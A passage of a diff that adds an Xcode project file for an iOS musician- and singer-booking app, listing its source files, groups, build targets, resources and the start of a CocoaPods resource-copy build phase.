+		FAB153BE28205DE200F3A540 /* BookNowWothCalendarVCBottom.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BookNowWothCalendarVCBottom.swift; sourceTree = "<group>"; };
+		FAB153BF28205DE200F3A540 /* BookNowWothCalendarVCBottom.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = BookNowWothCalendarVCBottom.xib; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		18759642264442130015BEBC /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0D725E766E10024E8FE /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1A118981B48C3C0DC71F594C /* Pods_SAMRAT.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0F025E766E20024E8FE /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				73D299B633F4EFDF37980AFF /* Pods_SAMRATTests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0FB25E766E20024E8FE /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				CE453B9CF770AF1623287508 /* Pods_SAMRAT_SAMRATUITests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		050F41EB7534C7FE1BC93A77 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1A50A2C33DC80C72DBD521F1 /* Pods_SAMRAT.framework */,
+				BF09C5547A0BC6EC073B7378 /* Pods_SAMRAT_SAMRATUITests.framework */,
+				10D449FD49F6DF71302C1C3B /* Pods_SAMRATTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		0D9ADEE3A95A33012531FC04 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				A59F84F4132ACB1A98419388 /* Pods-SAMRAT.debug.xcconfig */,
+				53A9B14FDDB2875EB7D4F5C4 /* Pods-SAMRAT.release.xcconfig */,
+				51D47556FB55840DA259AB62 /* Pods-SAMRAT-SAMRATUITests.debug.xcconfig */,
+				2191F26DCBE67705A21B5302 /* Pods-SAMRAT-SAMRATUITests.release.xcconfig */,
+				2A983411EC181C790467DF8D /* Pods-SAMRATTests.debug.xcconfig */,
+				5E52880D41254B99E21B7780 /* Pods-SAMRATTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		1808249E263A8F820081A704 /* BasicStuff */ = {
+			isa = PBXGroup;
+			children = (
+				180825A6263AA0CF0081A704 /* Model */,
+				18B6055E2638504B00AD9F47 /* BasicStuff.swift */,
+				18082558263A974A0081A704 /* AppLanguageManager.swift */,
+				18082560263A98890081A704 /* APIManager.swift */,
+				1808259C263A9A030081A704 /* Constant.swift */,
+				180825A1263AA09F0081A704 /* SamratGlobal.swift */,
+				180278D42641A7B800F97F83 /* GlobalAPICalling.swift */,
+			);
+			path = BasicStuff;
+			sourceTree = "<group>";
+		};
+		180825A6263AA0CF0081A704 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				BC32306D29DAD2700068CB36 /* SMBands */,
+				FA68640128A439F6007A22FE /* CountryModel.swift */,
+				180825A7263AA0DA0081A704 /* LoginResponse.swift */,
+				188B0D2D263B01D8001EDA26 /* SingerModel.swift */,
+				182F1016263C473000F93825 /* CreateBookingModel.swift */,
+				182F1022263C50DA00F93825 /* MusicianModel.swift */,
+				188E9E1D263FEACB00469D62 /* CategoriesModel.swift */,
+				18FB4C1926412E3D000971F7 /* FaqsModel.swift */,
+				187594E3264399C20015BEBC /* CSMCommanModel.swift */,
+				187594EF2643A9AA0015BEBC /* GalleryResponseModel.swift */,
+				187596062644139E0015BEBC /* BookingsModel.swift */,
+				18877B43264B878000123166 /* SettingsModel.swift */,
+				9A5CE42326CA889F004584A1 /* ServiceModel.swift */,
+				FAB153062816DE0300F3A540 /* SingerServiceModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		182F1027263C638200F93825 /* TVFooter */ = {
+			isa = PBXGroup;
+			children = (
+				FA8A433E27BD7D39000E370A /* ButtonCell.swift */,
+				FA8A433F27BD7D39000E370A /* ButtonCell.xib */,
+				182F1028263C63A900F93825 /* MusiciansTVFooter.swift */,
+				182F1030263C63B100F93825 /* MusiciansTVFooter.xib */,
+			);
+			path = TVFooter;
+			sourceTree = "<group>";
+		};
+		18559C8A264A2B150078C6C4 /* Lang */ = {
+			isa = PBXGroup;
+			children = (
+				18559C8B264A2B220078C6C4 /* Localizer.swift */,
+			);
+			path = Lang;
+			sourceTree = "<group>";
+		};
+		18759646264442130015BEBC /* OneSignalNotificationServiceExtension */ = {
+			isa = PBXGroup;
+			children = (
+				BCD9A81B2913A65B009CD8F6 /* OneSignalNotificationServiceExtension.entitlements */,
+				18759647264442130015BEBC /* NotificationService.swift */,
+				18759649264442130015BEBC /* Info.plist */,
+			);
+			path = OneSignalNotificationServiceExtension;
+			sourceTree = "<group>";
+		};
+		18877BAC264BC88D00123166 /* CustomFile */ = {
+			isa = PBXGroup;
+			children = (
+				1889FB3D264C4F630067464E /* AudioPlayer */,
+				420412082679F15F00309783 /* ActivityIndicatorWithLabel.swift */,
+			);
+			path = CustomFile;
+			sourceTree = "<group>";
+		};
+		1889FB3D264C4F630067464E /* AudioPlayer */ = {
+			isa = PBXGroup;
+			children = (
+				1889FB3E264C4F630067464E /* AudioErrorType.swift */,
+				1889FB3F264C4F630067464E /* Song_file.mp3 */,
+				1889FB40264C4F630067464E /* AudioPlayerManager.swift */,
+				1889FB41264C4F630067464E /* song_fille_2.mp3 */,
+			);
+			path = AudioPlayer;
+			sourceTree = "<group>";
+		};
+		188E9E22263FEB9C00469D62 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				188E9E23263FEBA700469D62 /* TVCell */,
+				188E9E2E263FF03500469D62 /* CatSingerListVC.swift */,
+				188E9E2F263FF03500469D62 /* CatSingerListVC.xib */,
+				185A6624264C03D0005D877C /* DemoGallaryVC.swift */,
+				185A6625264C03D0005D877C /* DemoGallaryVC.xib */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		188E9E23263FEBA700469D62 /* TVCell */ = {
+			isa = PBXGroup;
+			children = (
+				188E9E24263FEBCC00469D62 /* HomeTCell.swift */,
+				188E9E25263FEBCC00469D62 /* HomeTCell.xib */,
+				188E9E35263FF0BF00469D62 /* SingerTVCell.swift */,
+				188E9E36263FF0BF00469D62 /* SingerTVCell.xib */,
+			);
+			path = TVCell;
+			sourceTree = "<group>";
+		};
+		18B6054C263846EA00AD9F47 /* Settings */ = {
+			isa = PBXGroup;
+			children = (
+				18B605752638576300AD9F47 /* TVCell */,
+				18B6056A2638556700AD9F47 /* TVHeader */,
+				18B6054D2638470700AD9F47 /* MyAccountVC.swift */,
+				18B6054E2638470700AD9F47 /* MyAccountVC.xib */,
+				18B6055726384D4500AD9F47 /* ChangePasswordVC.swift */,
+				18B6055826384D4500AD9F47 /* ChangePasswordVC.xib */,
+				18B605632638526000AD9F47 /* FAQVC.swift */,
+				18B605642638526000AD9F47 /* FAQVC.xib */,
+				180278CD2641A29B00F97F83 /* EditProfileVC.swift */,
+				180278CE2641A29B00F97F83 /* EditProfileVC.xib */,
+				187594E826439CCA0015BEBC /* CancallationPolicyVC.swift */,
+				187594E926439CCA0015BEBC /* CancallationPolicyVC.xib */,
+				187595B82643FEFD0015BEBC /* MyBookingVC.swift */,
+				187595B92643FEFD0015BEBC /* MyBookingVC.xib */,
+			);
+			path = Settings;
+			sourceTree = "<group>";
+		};
+		18B6056A2638556700AD9F47 /* TVHeader */ = {
+			isa = PBXGroup;
+			children = (
+				18B6056B2638558400AD9F47 /* FaqTVHeader.swift */,
+				18B605702638558C00AD9F47 /* FaqTVHeader.xib */,
+			);
+			path = TVHeader;
+			sourceTree = "<group>";
+		};
+		18B605752638576300AD9F47 /* TVCell */ = {
+			isa = PBXGroup;
+			children = (
+				18B60576263857E800AD9F47 /* FaqTVCell.swift */,
+				18B60577263857E800AD9F47 /* FaqTVCell.xib */,
+				187595E9264404BC0015BEBC /* MyUpcomingTVCell.swift */,
+				187595EA264404BC0015BEBC /* MyUpcomingTVCell.xib */,
+			);
+			path = TVCell;
+			sourceTree = "<group>";
+		};
+		18B6057D263862ED00AD9F47 /* MUSICIANS */ = {
+			isa = PBXGroup;
+			children = (
+				182F1027263C638200F93825 /* TVFooter */,
+				18B605892638633500AD9F47 /* TVHeader */,
+				18B605882638632200AD9F47 /* TVCell */,
+				18B6057E2638631D00AD9F47 /* MUSICIANSVC.swift */,
+				18B6057F2638631D00AD9F47 /* MUSICIANSVC.xib */,
+				420DC766269C47EF0078B92E /* AlertView.swift */,
+				420DC765269C47EF0078B92E /* AlertView.xib */,
+				182413502639C4E200883026 /* OnlinePaymentVC.swift */,
+				182413512639C4E200883026 /* OnlinePaymentVC.xib */,
+				182F101B263C4A9900F93825 /* PaymentSuccessVC.swift */,
+				182F101C263C4A9900F93825 /* PaymentSuccessVC.xib */,
+				18190CE027F2A7430066036B /* WeddingMusiciaPaymentSucessVC.swift */,
+				18190CE127F2A7430066036B /* WeddingMusiciaPaymentSucessVC.xib */,
+			);
+			path = MUSICIANS;
+			sourceTree = "<group>";
+		};
+		18B605882638632200AD9F47 /* TVCell */ = {
+			isa = PBXGroup;
+			children = (
+				FA435E4F27C90F9D001AC622 /* CommonButton.swift */,
+				FA435E5027C90F9D001AC622 /* CommonButton.xib */,
+				FA8A433727BBB158000E370A /* MusiciansServiceTVCell.swift */,
+				FA8A433627BBB158000E370A /* MusiciansServiceTVCell.xib */,
+				18B60594263866F300AD9F47 /* MusiciansTVCell.swift */,
+				18B60595263866F300AD9F47 /* MusiciansTVCell.xib */,
+				182413572639CD4200883026 /* onlinePaymentMusiciansCell.swift */,
+				182413582639CD4200883026 /* onlinePaymentMusiciansCell.xib */,
+				9A36869026C6D1D100EDF026 /* ServicesCell.swift */,
+				9A36869126C6D1D100EDF026 /* ServicesCell.xib */,
+				FA8A433A27BCB54D000E370A /* MusicBarTableViewCell.swift */,
+				FA8A433B27BCB54D000E370A /* MusicBarTableViewCell.xib */,
+			);
+			path = TVCell;
+			sourceTree = "<group>";
+		};
+		18B605892638633500AD9F47 /* TVHeader */ = {
+			isa = PBXGroup;
+			children = (
+				18B6058A2638635D00AD9F47 /* MusicianTVHeader.swift */,
+				18B6058F2638636600AD9F47 /* MusicianTVHeader.xib */,
+			);
+			path = TVHeader;
+			sourceTree = "<group>";
+		};
+		18D2AC3127A81957008C8C28 /* CustomAlert */ = {
+			isa = PBXGroup;
+			children = (
+				18D2AC3227A81974008C8C28 /* CustomAlertPopupVC.swift */,
+				18D2AC3327A81974008C8C28 /* CustomAlertPopupVC.xib */,
+			);
+			path = CustomAlert;
+			sourceTree = "<group>";
+		};
+		18D3327027F2254500D5A92A /* SubCategoriesScreen */ = {
+			isa = PBXGroup;
+			children = (
+				18D3327127F2257600D5A92A /* SubCategoriesVC.swift */,
+				18D3327227F2257600D5A92A /* SubCategoriesVC.xib */,
+			);
+			path = SubCategoriesScreen;
+			sourceTree = "<group>";
+		};
+		18D7F5F4263987290074FBC0 /* Singers */ = {
+			isa = PBXGroup;
+			children = (
+				FAB153BE28205DE200F3A540 /* BookNowWothCalendarVCBottom.swift */,
+				FAB153BF28205DE200F3A540 /* BookNowWothCalendarVCBottom.xib */,
+				18D7F64B263989640074FBC0 /* BookNowWothCalendarVC.swift */,
+				18D7F64C263989640074FBC0 /* BookNowWothCalendarVC.xib */,
+				9A7D888A26C1B7EC00DC1C28 /* MultipleSingerVC.swift */,
+				9A7D888B26C1B7EC00DC1C28 /* MultipleSingerVC.xib */,
+				9A04CE7026C521A900425575 /* MultipleSingersMusicianbookVC.swift */,
+				9A04CE7126C521A900425575 /* MultipleSingersMusicianbookVC.xib */,
+			);
+			path = Singers;
+			sourceTree = "<group>";
+		};
+		390943902E0058FA0084B250 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				3909438C2E0058FA0084B250 /* FTAnimation+UIView.m */,
+				3909438D2E0058FA0084B250 /* FTAnimationManager.m */,
+				3909438E2E0058FA0084B250 /* FTUtils+NSObject.m */,
+				3909438F2E0058FA0084B250 /* FTUtils+UIGestureRecognizer.m */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		390943972E0058FA0084B250 /* FTUtils */ = {
+			isa = PBXGroup;
+			children = (
+				390943912E0058FA0084B250 /* FTAnimation.h */,
+				390943922E0058FA0084B250 /* FTAnimation+UIView.h */,
+				390943932E0058FA0084B250 /* FTAnimationManager.h */,
+				390943942E0058FA0084B250 /* FTUtils.h */,
+				390943952E0058FA0084B250 /* FTUtils+NSObject.h */,
+				390943962E0058FA0084B250 /* FTUtils+UIGestureRecognizer.h */,
+			);
+			path = FTUtils;
+			sourceTree = "<group>";
+		};
+		390943982E0058FA0084B250 /* Headers */ = {
+			isa = PBXGroup;
+			children = (
+				390943972E0058FA0084B250 /* FTUtils */,
+			);
+			path = Headers;
+			sourceTree = "<group>";
+		};
+		390943992E0058FA0084B250 /* FTUtils */ = {
+			isa = PBXGroup;
+			children = (
+				390943902E0058FA0084B250 /* Classes */,
+				390943982E0058FA0084B250 /* Headers */,
+			);
+			path = FTUtils;
+			sourceTree = "<group>";
+		};
+		9164F0D125E766E10024E8FE = {
+			isa = PBXGroup;
+			children = (
+				9164F0DC25E766E10024E8FE /* SAMRAT */,
+				9164F0F625E766E20024E8FE /* SAMRATTests */,
+				9164F10125E766E20024E8FE /* SAMRATUITests */,
+				18759646264442130015BEBC /* OneSignalNotificationServiceExtension */,
+				9164F0DB25E766E10024E8FE /* Products */,
+				0D9ADEE3A95A33012531FC04 /* Pods */,
+				050F41EB7534C7FE1BC93A77 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		9164F0DB25E766E10024E8FE /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				9164F0DA25E766E10024E8FE /* SAMRAT.app */,
+				9164F0F325E766E20024E8FE /* SAMRATTests.xctest */,
+				9164F0FE25E766E20024E8FE /* SAMRATUITests.xctest */,
+				18759645264442130015BEBC /* OneSignalNotificationServiceExtension.appex */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		9164F0DC25E766E10024E8FE /* SAMRAT */ = {
+			isa = PBXGroup;
+			children = (
+				18877BAC264BC88D00123166 /* CustomFile */,
+				18559C8A264A2B150078C6C4 /* Lang */,
+				1875963D264441AE0015BEBC /* SAMRAT.entitlements */,
+				1808249E263A8F820081A704 /* BasicStuff */,
+				9179E90225E76A4000B3DC53 /* AppDelegate */,
+				9179E90425E76A4000B3DC53 /* AppGlobal */,
+				9179E90525E76A4000B3DC53 /* AppViewController */,
+				9164F0DF25E766E10024E8FE /* SceneDelegate.swift */,
+				1875965926444B330015BEBC /* GoogleService-Info.plist */,
+				420412062679EB9600309783 /* loading-icon_2.gif */,
+				9164F0E325E766E10024E8FE /* Main.storyboard */,
+				9164F0E925E766E20024E8FE /* Assets.xcassets */,
+				9164F0EB25E766E20024E8FE /* LaunchScreen.storyboard */,
+				9164F0EE25E766E20024E8FE /* Info.plist */,
+				9164F0E625E766E10024E8FE /* SAMRAT.xcdatamodeld */,
+				184FF37026499A4F00BDC454 /* Localizable.strings */,
+				F7A06AB1270AE14B00063A8C /* Model.xcdatamodeld */,
+				3909439E2E00591C0084B250 /* SAMRAT-Header.h */,
+			);
+			path = SAMRAT;
+			sourceTree = "<group>";
+		};
+		9164F0F625E766E20024E8FE /* SAMRATTests */ = {
+			isa = PBXGroup;
+			children = (
+				9164F0F725E766E20024E8FE /* SAMRATTests.swift */,
+				9164F0F925E766E20024E8FE /* Info.plist */,
+			);
+			path = SAMRATTests;
+			sourceTree = "<group>";
+		};
+		9164F10125E766E20024E8FE /* SAMRATUITests */ = {
+			isa = PBXGroup;
+			children = (
+				9164F10225E766E20024E8FE /* SAMRATUITests.swift */,
+				9164F10425E766E20024E8FE /* Info.plist */,
+			);
+			path = SAMRATUITests;
+			sourceTree = "<group>";
+		};
+		9179E90225E76A4000B3DC53 /* AppDelegate */ = {
+			isa = PBXGroup;
+			children = (
+				9179E90325E76A4000B3DC53 /* AppDelegate.swift */,
+			);
+			path = AppDelegate;
+			sourceTree = "<group>";
+		};
+		9179E90425E76A4000B3DC53 /* AppGlobal */ = {
+			isa = PBXGroup;
+			children = (
+				9180CA5025EB633C00C37532 /* AppGlobal.swift */,
+				BC32307229DAD2D10068CB36 /* APIClient.swift */,
+				BC32307429DAD3440068CB36 /* NetConnection.swift */,
+			);
+			path = AppGlobal;
+			sourceTree = "<group>";
+		};
+		9179E90525E76A4000B3DC53 /* AppViewController */ = {
+			isa = PBXGroup;
+			children = (
+				FA68640728A43E61007A22FE /* CountrySelectionCell */,
+				FA68640328A43A42007A22FE /* CountrySelectionViewController.swift */,
+				FA8F917627BA735600339EAE /* MusiciansDetailViewController.swift */,
+				18D2AC3127A81957008C8C28 /* CustomAlert */,
+				188E9E22263FEB9C00469D62 /* Home */,
+				18D7F5F4263987290074FBC0 /* Singers */,
+				18B6057D263862ED00AD9F47 /* MUSICIANS */,
+				18B6054C263846EA00AD9F47 /* Settings */,
+				9180CA5525EB672C00C37532 /* AppTableViewCell */,
+				9179E90625E76A4000B3DC53 /* ViewController.swift */,
+				390943992E0058FA0084B250 /* FTUtils */,
+				18D3327027F2254500D5A92A /* SubCategoriesScreen */,
+				425D610226904F3100B9B548 /* UImageView+Extension.swift */,
+				9179E92825E76B2C00B3DC53 /* TabBarViewController.swift */,
+				9179E90C25E76A5500B3DC53 /* HomeViewController.swift */,
+				42E1CBD2269CB555005F37C4 /* HBSegmentedControl.swift */,
+				42E1CBD0269CB06E005F37C4 /* AppConstant.swift */,
+				9179E91125E76A6F00B3DC53 /* MusiciansViewController.swift */,
+				9180CA5F25EB927C00C37532 /* MusiciansDetailsViewController.swift */,
+				9179E91625E76A7D00B3DC53 /* GalleryViewController.swift */,
+				9179E91B25E76A8800B3DC53 /* SettingsViewController.swift */,
+				9180CA6C25EB9CD100C37532 /* LoginViewController.swift */,
+				9180CA7125EB9CDD00C37532 /* ForgotPasswordViewController.swift */,
+				9180CA7625EB9CE600C37532 /* SignUpViewController.swift */,
+				9180CA7B25EB9CF000C37532 /* ContactUsViewController.swift */,
+				9180CA8025EB9D7900C37532 /* CMSViewController.swift */,
+				F78CD53C26D2059B00178848 /* LanguageSelectVC.swift */,
+				F78CD54226D21D3500178848 /* VerifyOTPVC.swift */,
+				F78CD54826D21D4500178848 /* SendOTPVC.swift */,
+				FA7724EA280D89C50031DEAC /* MaintenanceViewController.swift */,
+				BCC211C22901572900CFC359 /* WebPaymentVC.swift */,
+				BC91785729D7193500158B7A /* SelectBandViewController.swift */,
+			);
+			path = AppViewController;
+			sourceTree = "<group>";
+		};
+		9180CA5525EB672C00C37532 /* AppTableViewCell */ = {
+			isa = PBXGroup;
+			children = (
+				9180CA5A25EB8C2A00C37532 /* MusiciansTableViewCell.swift */,
+				4204120E267B38B400309783 /* MusicianListCell.swift */,
+				4204120F267B38B400309783 /* MusicianListCell.xib */,
+				4204120A267B389100309783 /* MusicianListHeaderCell.swift */,
+				4204120B267B389100309783 /* MusicianListHeaderCell.xib */,
+				9180CA6725EB9B0100C37532 /* SettingsTableViewCell.swift */,
+				425D61002685B38400B9B548 /* CircularProgressBar.swift */,
+			);
+			path = AppTableViewCell;
+			sourceTree = "<group>";
+		};
+		BC32306D29DAD2700068CB36 /* SMBands */ = {
+			isa = PBXGroup;
+			children = (
+				BC32306E29DAD2700068CB36 /* SMBandsBand.swift */,
+				BC32306F29DAD2700068CB36 /* SMBands.swift */,
+			);
+			path = SMBands;
+			sourceTree = "<group>";
+		};
+		FA68640728A43E61007A22FE /* CountrySelectionCell */ = {
+			isa = PBXGroup;
+			children = (
+				FA68640928A43E7D007A22FE /* CountrySelectionTableViewCell.swift */,
+				FA68640828A43E7C007A22FE /* CountrySelectionTableViewCell.xib */,
+			);
+			path = CountrySelectionCell;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		18759644264442130015BEBC /* OneSignalNotificationServiceExtension */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1875964D264442130015BEBC /* Build configuration list for PBXNativeTarget "OneSignalNotificationServiceExtension" */;
+			buildPhases = (
+				18759641264442130015BEBC /* Sources */,
+				18759642264442130015BEBC /* Frameworks */,
+				18759643264442130015BEBC /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = OneSignalNotificationServiceExtension;
+			productName = OneSignalNotificationServiceExtension;
+			productReference = 18759645264442130015BEBC /* OneSignalNotificationServiceExtension.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
+		9164F0D925E766E10024E8FE /* SAMRAT */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 9164F10725E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRAT" */;
+			buildPhases = (
+				534CED750EF0CD6546425F7D /* [CP] Check Pods Manifest.lock */,
+				9164F0D625E766E10024E8FE /* Sources */,
+				9164F0D725E766E10024E8FE /* Frameworks */,
+				9164F0D825E766E10024E8FE /* Resources */,
+				BB3869AC981C2BB7CD129350 /* [CP] Embed Pods Frameworks */,
+				04DD0A2836038F8ED37B4C55 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = SAMRAT;
+			productName = SAMRAT;
+			productReference = 9164F0DA25E766E10024E8FE /* SAMRAT.app */;
+			productType = "com.apple.product-type.application";
+		};
+		9164F0F225E766E20024E8FE /* SAMRATTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 9164F10A25E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRATTests" */;
+			buildPhases = (
+				12CE8029EF21A20032EB96FD /* [CP] Check Pods Manifest.lock */,
+				9164F0EF25E766E20024E8FE /* Sources */,
+				9164F0F025E766E20024E8FE /* Frameworks */,
+				9164F0F125E766E20024E8FE /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				9164F0F525E766E20024E8FE /* PBXTargetDependency */,
+			);
+			name = SAMRATTests;
+			productName = SAMRATTests;
+			productReference = 9164F0F325E766E20024E8FE /* SAMRATTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		9164F0FD25E766E20024E8FE /* SAMRATUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 9164F10D25E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRATUITests" */;
+			buildPhases = (
+				9CFEB496C61E0857A922BC75 /* [CP] Check Pods Manifest.lock */,
+				9164F0FA25E766E20024E8FE /* Sources */,
+				9164F0FB25E766E20024E8FE /* Frameworks */,
+				9164F0FC25E766E20024E8FE /* Resources */,
+				935170790BE283D5911D9462 /* [CP] Embed Pods Frameworks */,
+				54F1D1AFC2EA02E8ECF296B0 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				9164F10025E766E20024E8FE /* PBXTargetDependency */,
+			);
+			name = SAMRATUITests;
+			productName = SAMRATUITests;
+			productReference = 9164F0FE25E766E20024E8FE /* SAMRATUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		9164F0D225E766E10024E8FE /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1240;
+				LastUpgradeCheck = 1220;
+				TargetAttributes = {
+					18759644264442130015BEBC = {
+						CreatedOnToolsVersion = 12.4;
+					};
+					9164F0D925E766E10024E8FE = {
+						CreatedOnToolsVersion = 12.2;
+					};
+					9164F0F225E766E20024E8FE = {
+						CreatedOnToolsVersion = 12.2;
+						TestTargetID = 9164F0D925E766E10024E8FE;
+					};
+					9164F0FD25E766E20024E8FE = {
+						CreatedOnToolsVersion = 12.2;
+						TestTargetID = 9164F0D925E766E10024E8FE;
+					};
+				};
+			};
+			buildConfigurationList = 9164F0D525E766E10024E8FE /* Build configuration list for PBXProject "SAMRAT" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+				ar,
+			);
+			mainGroup = 9164F0D125E766E10024E8FE;
+			productRefGroup = 9164F0DB25E766E10024E8FE /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				9164F0D925E766E10024E8FE /* SAMRAT */,
+				9164F0F225E766E20024E8FE /* SAMRATTests */,
+				9164F0FD25E766E20024E8FE /* SAMRATUITests */,
+				18759644264442130015BEBC /* OneSignalNotificationServiceExtension */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		18759643264442130015BEBC /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0D825E766E10024E8FE /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1824135A2639CD4200883026 /* onlinePaymentMusiciansCell.xib in Resources */,
+				42041211267B38B400309783 /* MusicianListCell.xib in Resources */,
+				18B60579263857E800AD9F47 /* FaqTVCell.xib in Resources */,
+				18B605712638558C00AD9F47 /* FaqTVHeader.xib in Resources */,
+				18D7F64E263989640074FBC0 /* BookNowWothCalendarVC.xib in Resources */,
+				18B605812638631D00AD9F47 /* MUSICIANSVC.xib in Resources */,
+				18B6055A26384D4500AD9F47 /* ChangePasswordVC.xib in Resources */,
+				180278D02641A29B00F97F83 /* EditProfileVC.xib in Resources */,
+				18B605502638470700AD9F47 /* MyAccountVC.xib in Resources */,
+				182413532639C4E200883026 /* OnlinePaymentVC.xib in Resources */,
+				9164F0ED25E766E20024E8FE /* LaunchScreen.storyboard in Resources */,
+				184FF36E26499A4F00BDC454 /* Localizable.strings in Resources */,
+				9164F0EA25E766E20024E8FE /* Assets.xcassets in Resources */,
+				185A6627264C03D0005D877C /* DemoGallaryVC.xib in Resources */,
+				FA8A433827BBB158000E370A /* MusiciansServiceTVCell.xib in Resources */,
+				FA8A434127BD7D39000E370A /* ButtonCell.xib in Resources */,
+				9164F0E525E766E10024E8FE /* Main.storyboard in Resources */,
+				188E9E31263FF03500469D62 /* CatSingerListVC.xib in Resources */,
+				9A36869326C6D1D100EDF026 /* ServicesCell.xib in Resources */,
+				187594EB26439CCA0015BEBC /* CancallationPolicyVC.xib in Resources */,
+				420DC767269C47F00078B92E /* AlertView.xib in Resources */,
+				18D2AC3527A81974008C8C28 /* CustomAlertPopupVC.xib in Resources */,
+				18D3327427F2257600D5A92A /* SubCategoriesVC.xib in Resources */,
+				1889FB43264C4F630067464E /* Song_file.mp3 in Resources */,
+				187595EC264404BC0015BEBC /* MyUpcomingTVCell.xib in Resources */,
+				FAB153C128205DE300F3A540 /* BookNowWothCalendarVCBottom.xib in Resources */,
+				9A04CE7326C521A900425575 /* MultipleSingersMusicianbookVC.xib in Resources */,
+				18190CE327F2A7430066036B /* WeddingMusiciaPaymentSucessVC.xib in Resources */,
+				420412072679EB9600309783 /* loading-icon_2.gif in Resources */,
+				9A7D888D26C1B7EC00DC1C28 /* MultipleSingerVC.xib in Resources */,
+				188E9E38263FF0BF00469D62 /* SingerTVCell.xib in Resources */,
+				182F1031263C63B100F93825 /* MusiciansTVFooter.xib in Resources */,
+				1875965A26444B340015BEBC /* GoogleService-Info.plist in Resources */,
+				FA435E5227C90F9D001AC622 /* CommonButton.xib in Resources */,
+				18B605662638526000AD9F47 /* FAQVC.xib in Resources */,
+				188E9E27263FEBCC00469D62 /* HomeTCell.xib in Resources */,
+				187595BB2643FEFD0015BEBC /* MyBookingVC.xib in Resources */,
+				FA68640A28A43E7D007A22FE /* CountrySelectionTableViewCell.xib in Resources */,
+				182F101E263C4A9900F93825 /* PaymentSuccessVC.xib in Resources */,
+				FA8A433D27BCB54D000E370A /* MusicBarTableViewCell.xib in Resources */,
+				1889FB45264C4F630067464E /* song_fille_2.mp3 in Resources */,
+				18B605902638636600AD9F47 /* MusicianTVHeader.xib in Resources */,
+				18B60597263866F300AD9F47 /* MusiciansTVCell.xib in Resources */,
+				4204120D267B389100309783 /* MusicianListHeaderCell.xib in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0F125E766E20024E8FE /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0FC25E766E20024E8FE /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		04DD0A2836038F8ED37B4C55 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
